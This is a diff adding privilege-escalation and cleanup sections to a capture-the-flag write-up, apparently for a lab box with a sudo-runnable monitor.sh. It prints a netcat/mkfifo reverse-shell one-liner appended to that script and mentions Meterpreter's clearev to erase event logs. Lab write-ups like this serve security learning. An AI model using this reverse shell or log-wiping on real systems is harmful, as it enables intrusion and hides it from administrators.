@@ -46,7 +46,7 @@ We're in! After a while of searching I decided to check for exploits. We just se
 
 ![1search](https://i.imgur.com/rFxtQsi.png)
 
-## 2. Exploit
+## 3. Exploit
 
 ![1splot](https://i.imgur.com/CISJNvpg.png)
 
@@ -54,6 +54,33 @@ Setup the exploit. Additional we set the Listerner LHOST to our IP and LPORT to 
 After that we fired it up.
 
 ![2splot](https://i.imgur.com/ZE648q2.png)
+
+## 4. Capturing the Flag
+
+Somebody left the flag after exploiting the monitor.sh in the /tmp/ folder, but I wanted to get it for real myself.
+I found a zip within home/nibbler with a monitor.sh in it.
+
+![1ctf](https://i.imgur.com/HfUWxlj.png)
+
+After that I did set up a nc listener on post 2491 and added following command into the monitor.sh file.
+
+`echp "rm/tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.XXX 2491 >/tmp/f" >> monitor.sh`
+
+Thank you for that command @sicurolab.
+
+![2ctf](https://i.imgur.com/ANHg0Jv.png)
+
+We then execute the monitor.sh file with /usr/bin/sudo and receive our root shell.
+
+![3ctf](https://i.imgur.com/J05iDMS.png)
+
+`cat root.txt` - system flag captured!
+
+## 8. Cleanup
+ 
+Firstup I cleaned the whole /tmp/ folder to make it harder for future players. 
+Since this is a CTF, cleanup isn’t mandatory.
+However, we want to develop good habits and operational security practice. Meterpreter has a `clearev` command that can be used to cover our tracks - let’s run it and be out of here.
 
 
 
